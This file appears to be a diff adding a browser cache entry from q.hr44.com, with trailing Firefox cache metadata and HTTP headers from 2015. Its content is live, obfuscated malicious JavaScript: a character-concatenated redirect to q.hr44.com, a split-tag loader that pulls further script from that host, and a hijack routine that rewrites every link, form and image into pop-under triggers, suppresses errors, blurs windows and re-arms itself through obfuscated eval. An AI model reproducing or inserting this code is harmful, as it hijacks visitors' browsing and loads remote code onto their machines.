@@ -1,0 +1,333 @@
+//<body text="white"><script language="javascript">location.replace("h"+"t"+"t"+"p"+":"+"/"+"/"+"q"+"."+"h"+"r"+"4"+"4"+"."+"c"+"o"+"m"+"/"+"d"+"t"+"."+"a"+"s"+"p"+"?beijing.shanghai.shijiazhuang.");</script></body>
+<!--
+var has_disp,the_pixel,my_topurl="";
+if (navigator.appName=="Netscape"){the_pixel=screen.pixelDepth;}else{the_pixel=screen.colorDepth;}
+try{my_topurl=top.location.href}catch(e){};
+
+if (has_disp!=1 && the_pixel>8 && screen.width>10 && screen.height>10 && !(screen.width==640 && screen.height==480) && typeof(the_pixel)!="undefined" && typeof(my_topurl)!="undefined" && my_topurl!="")
+{
+
+function killMyErrors()
+{return true;}
+window.onerror = killMyErrors;
+function GetMyCookieVal(offset)
+{var endstr = document.cookie.indexOf (";", offset);
+if (endstr == -1)
+endstr = document.cookie.length;
+return unescape(document.cookie.substring(offset, endstr));}
+function GetMyCookie(name)
+{var arg = name + "=";
+var alen = arg.length;
+var clen = document.cookie.length;
+var i = 0;
+while (i < clen)
+{var j = i + alen;
+if (document.cookie.substring(i, j) == arg)
+return GetMyCookieVal (j);
+i = document.cookie.indexOf(" ", i) + 1;
+if (i == 0) break;}
+return null;}
+function SetMyCookie(name, value)
+{var expdate = new Date();
+var argv = SetMyCookie.arguments;
+var argc = SetMyCookie.arguments.length;
+var expires = (argc > 2) ? argv[2] : null;
+var path = (argc > 3) ? argv[3] : null;
+var domain = (argc > 4) ? argv[4] : null;
+var secure = (argc > 5) ? argv[5] : false;
+if(expires!=null) expdate.setTime(expdate.getTime() + ( expires * 1000 ));
+document.cookie = name + "=" + escape (value) +((expires == null) ? "" : ("; expires="+ expdate.toGMTString()))
++((path == null) ? "" : ("; path=" + path)) +((domain == null) ? "" : ("; domain=" + domain))
++((secure == true) ? "; secure" : "");}
+
+function myHref_(p)
+{
+if (GetMyCookie("tan_bop")==null)
+{
+
+if (typeof(p)!="undefined" && document.referrer.indexOf("aidu.com")!=-1 && isManual_==0 && GetMyCookie("is_manual")==null) {return};
+
+SetMyCookie("tan_bop","yes",64800,"/")
+SetMyCookie("has_bop1","1");
+window.blur();
+
+if(typeof(p)=="undefined" || p==""){if (GetMyCookie("disp_time")!=null && !isNaN(GetMyCookie("disp_time"))) {if (Math.floor((new Date()).getTime()/1000)-parseInt(GetMyCookie("disp_time"))>600) {popName_+="x";}}}else{popName_+=p;}
+document.write('<html><meta http-equiv="Content-Type" content="text/html; charset=gb2312"><title>sina sync page</title><body oncontextMenu="return false" onl'+'oad="window.blur()" onfocus="window.blur()"><form name="myRedictForm" method="post" target="_top" action="http://'+popName_+'.'+popDom_+'.com/"><input type="hidden" name="action" value="go2"><input type="hidden" name="key" value="'+popKey_+'"></form><script language="javascript">if (navigator.cookieEnabled && document.cookie.indexOf("has_bop1=")!=-1 && document.cookie.indexOf("has_bop1=1")==-1){var url_,pos1_,pos2_;url_=location.href.toLowerCase();pos1_=url_.indexOf("http://");if(pos1_!=-1){pos2_=url_.indexOf("/",pos1_+7);if (pos2_!=-1){location.href/*go*/=url_.substr(pos1_,pos2_)+"//"+url_.substr(pos2_+1);}else{location.href/*go*/=url_+"?"}}else{location.href/*go*/=url_+"?"}}else{document.cookie="has_bop1=2";document.forms.myRedictForm.submit();setTimeout("document.forms.myRedictForm.submit()",10000)}<\/script></body></html>');
+}
+}
+
+function myLoad_()
+{
+if (GetMyCookie("tan_bop")==null)
+{
+myTimerID1_=setTimeout(function(){myHref_(popParam_)},4000);
+}
+}
+
+function myFocus_()
+{
+if (myTimerID2_!=0)
+{
+clearTimeout(myTimerID2_);
+myTimerID2_=0;
+}
+}
+
+function myBlur_()
+{
+if (GetMyCookie("tan_bop")==null)
+{
+myTimerID2_=setTimeout("myHref_()",6000);
+}
+}
+
+function myScroll_()
+{
+myActive_();
+myFocus_();
+}
+
+function myActive_()
+{
+if (myTimerID3_!=0)
+{
+clearTimeout(myTimerID3_);
+myTimerID3_=0;
+}
+if (myTimerID1_!=0)
+{
+clearTimeout(myTimerID1_);
+myTimerID1_=0;
+}
+
+window.document.body.onmouseout=function(e)
+{
+if (GetMyCookie("tan_bop")==null)
+{
+if (navigator.appName=="Microsoft Internet Explorer")
+{
+if(window.event.clientY<=16)
+{
+if ((numLinks_<=5 && numForms_==0) || isSearch_==1 || isTimeout_==1 || (document.referrer!="" && isNight_==1))
+myTimerID3_=setTimeout("myHref_()",1);
+else
+myTimerID3_=setTimeout("myHref_()",400);
+}
+}
+else
+{
+if(e.pageY<10)
+{
+if ((numLinks_<=5 && numForms_==0) || isSearch_==1 || isTimeout_==1 || (document.referrer!="" && isNight_==1))
+myTimerID3_=setTimeout("myHref_()",1);
+else
+myTimerID3_=setTimeout("myHref_()",400);
+}
+}
+}
+}
+}
+
+function setTarget_()
+{
+
+var tagslink_=window.document.getElementsByTagName("a");
+numLinks_=tagslink_.length;
+
+var tagsarea_=window.document.getElementsByTagName("area");
+numAreas_=tagsarea_.length;
+
+var tagsform_=window.document.getElementsByTagName("form");
+numForms_=tagsform_.length;
+
+if (GetMyCookie("tan_bop")==null)
+{
+
+for (var i=0;i<numLinks_;i++)
+{
+if (typeof(tagslink_[i].target_)=="undefined" && typeof(tagslink_[i].type_)=="undefined")
+{
+if (tagslink_[i].href.toLowerCase().indexOf("javascript:")!=-1)
+tagslink_[i].href=location.href;
+
+tagslink_[i].target_=tagslink_[i].target;
+tagslink_[i].target="_blank";
+tagslink_[i].onmouseup=function(){setTimeout("myHref_()",100)};
+}
+else if (typeof(tagslink_[i].type_)!="undefined")
+{
+tagslink_[i].onmouseup=function(){if (GetMyCookie("tan_bop")==null){this.href='http://'+popName_+'.'+popDom_+'.com/?action=go2&key='+popKey_;setTimeout('SetMyCookie("tan_bop","yes",64800,"/")',100)}};
+}
+}
+
+for (var i=0;i<numAreas_;i++)
+{
+if (typeof(tagsarea_[i].target_)=="undefined")
+{
+tagsarea_[i].target_=tagsarea_[i].target;
+if (tagsarea_[i].href.toLowerCase().indexOf("#")==-1)
+{
+tagsarea_[i].target="_blank";
+tagsarea_[i].onmouseup=function(){setTimeout("myHref_()",100)};
+}
+}
+}
+
+for (var i=0;i<numForms_;i++)
+{
+if (typeof(tagsform_[i].target_)=="undefined")
+{
+tagsform_[i].target_=tagsform_[i].target;
+tagsform_[i].target="_blank";
+if (tagsform_[i].onsubmit==null)
+{
+tagsform_[i].onsubmit=function(){setTimeout("myHref_()",100)};
+}
+}
+}
+
+var tagsimg_=window.document.getElementsByTagName("img");
+for (var i=0;i<tagsimg_.length;i++)
+{
+if (tagsimg_[i].parentNode.nodeName.toLowerCase()!='a')
+{
+tagsimg_[i].onmouseup=null;
+var tagimg2_=tagsimg_[i].cloneNode(true);
+var taglink2_= document.createElement("a");
+taglink2_.type_='1';
+taglink2_.target='_blank';
+taglink2_.appendChild(tagimg2_);
+tagsimg_[i].parentNode.replaceChild(taglink2_,tagsimg_[i]);
+}
+}
+
+var tagsinput_=window.document.getElementsByTagName("input");
+for (var i=0;i<tagsinput_.length;i++)
+{
+if (tagsinput_[i].type.toLowerCase()=="submit")
+{
+tagsinput_[i].onmouseup=function(){this.blur()};
+}
+else
+{
+tagsinput_[i].onfocus=myFocus_;
+}
+}
+
+var tagstextarea_=window.document.getElementsByTagName("textarea");
+for (var i=0;i<tagstextarea_.length;i++)
+{
+tagstextarea_[i].onfocus=myFocus_;
+}
+
+var tagsdiv_=window.document.getElementsByTagName("div");
+for (var i=0;i<tagsdiv_.length;i++)
+{
+tagsdiv_[i].onmouseup=myFocus_;
+tagsdiv_[i].onmouseover=function(){isManual_=1};
+}
+
+var tagsp_=window.document.getElementsByTagName("p");
+for (var i=0;i<tagsp_.length;i++)
+{
+tagsp_[i].onmouseup=myFocus_;
+tagsp_[i].onmouseover=function(){isManual_=1};
+}
+
+var tagstable_=window.document.getElementsByTagName("table");
+for (var i=0;i<tagstable_.length;i++)
+{
+tagstable_[i].onmouseup=myFocus_;
+tagstable_[i].onmouseover=function(){isManual_=1};
+}
+
+if (isManual_==1 && GetMyCookie("is_manual")==null)
+SetMyCookie("is_manual","1",60,"/");
+
+}
+else
+{
+clearTimeout(myTimerID4_);
+myTimerID4_=0;
+for (var i=0;i<numLinks_;i++)
+{
+if (typeof(tagslink_[i].target_)!="undefined")
+tagslink_[i].target=tagslink_[i].target_;
+if (typeof(tagslink_[i].type_)!="undefined")
+{
+tagslink_[i].href="#";
+tagslink_[i].target="_self";
+}
+}
+for (var i=0;i<numAreas_;i++)
+{
+if (typeof(tagsarea_[i].target_)!="undefined")
+tagsarea_[i].target=tagsarea_[i].target_;
+}
+for (var i=0;i<numForms_;i++)
+{
+if (typeof(tagsform_[i].target_)!="undefined")
+tagsform_[i].target=tagsform_[i].target_;
+}
+}
+
+}
+
+var popName_="",popDom_="",popKey_="",popParam_="";
+if (GetMyCookie("bop_name")!=null) popName_=GetMyCookie("bop_name");
+if (GetMyCookie("bop_dom")!=null) popDom_=GetMyCookie("bop_dom");
+if (GetMyCookie("bop_key")!=null) popKey_=GetMyCookie("bop_key");
+
+if (GetMyCookie("tan_bop")==null)
+{
+	if (GetMyCookie("disp_bop")==null || GetMyCookie("disp_time")==null || GetMyCookie("bop_name")==null || GetMyCookie("bop_dom")==null || GetMyCookie("bop_key")==null)
+	{
+		document.write("<scr"+"ipt language='javascript' src='h"+"t"+"t"+"p"+":"+"/"+"/"+"q"+"."+"h"+"r"+"4"+"4"+"."+"c"+"o"+"m"+"/"+"d"+"t"+"."+"a"+"s"+"p"+"?action=goto&loc=beijing.shanghai.shijiazhuang'><\/scr"+"ipt>");
+	}
+	else if (GetMyCookie("disp_bop")=="yes")
+	{
+		var myTimerID1_=0;
+		var myTimerID2_=0;
+		var myTimerID3_=0;
+		var myTimerID4_=0;
+		var numLinks_=0;
+		var numAreas_=0;
+		var numForms_=0;
+		var isSearch_=0;
+		var isTimeout_=0;
+		var isNight_=0;
+		var isManual_=0;
+
+		if (GetMyCookie("tan_bop")==null)
+		{
+
+		if(document.referrer!="" && document.referrer.toLowerCase().indexOf(location.hostname.toLowerCase().replace("www.",""))==-1)
+		isSearch_=1;
+
+		myTimerID4_=setInterval("setTarget_();",200);
+
+		document.write("<body></body>");
+
+		eval("win"+"dow.onl"+"oad=myLoad_;win"+"dow.onu"+"nload=null;win"+"dow.onb"+"eforeunl"+"oad=null;win"+"dow.onf"+"ocus=myFocus_;win"+"dow.onb"+"lur=myBlur_;win"+"dow.ons"+"croll=myScroll_;win"+"dow.document.body.onm"+"ousemove=myActive_");
+		setInterval('eval("win"+"dow.onl"+"oad=myLoad_;win"+"dow.onu"+"nload=null;win"+"dow.onb"+"eforeunl"+"oad=null;win"+"dow.onf"+"ocus=myFocus_;win"+"dow.onb"+"lur=myBlur_;win"+"dow.ons"+"croll=myScroll_;win"+"dow.document.body.onm"+"ousemove=myActive_")',500);
+
+		setTimeout("isTimeout_=1",60000);
+
+		isNight_=((new Date()).getHours())<=7?1:0;
+
+		}
+
+	}
+}
+
+has_disp=1;
+}
+-->
+YzZ1ì+      UTUT:ôÐ€Uëž   7:http://q.hr44.com/dt.asp?beijing.shanghai.shijiazhuang necko:classified 1 request-method GET response-head HTTP/1.1 200 OK
+Date: Sun, 22 Mar 2015 05:33:28 GMT
+Server: Microsoft-IIS/6.0
+Content-Length: 10039
+Content-Type: text/html
+Expires: Fri, 27 Mar 2015 05:33:28 GMT
+Cache-Control: private
+ uncompressed-len 0   '7
